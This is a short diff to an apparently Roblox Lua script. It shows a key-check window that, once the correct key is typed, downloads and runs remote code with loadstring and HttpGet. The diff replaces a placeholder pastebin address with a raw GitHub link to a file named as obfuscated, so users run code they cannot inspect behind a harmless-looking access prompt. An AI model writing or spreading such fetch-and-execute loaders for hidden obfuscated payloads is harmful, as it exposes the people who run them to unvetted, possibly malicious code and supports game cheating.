@@ -26,7 +26,7 @@ VerifyButton.MouseButton1Click:Connect(function()
     if TextBox.Text == CorrectKey then
         ScreenGui:Destroy()
         print("Access Granted!") 
-        loadstring(game:HttpGet("https://yourpastebin.com/raw/script"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RedJDark/MAIN/refs/heads/main/obf_gfu6wLA5Oj4Rec7Z6U2F4L8S4ZacJ362Rmydfm35QRd3i2d2713v8Rb836IZM10C.lua%20(1).txt"))()
     else
         TextBox.Text = "Invalid Key"
     end
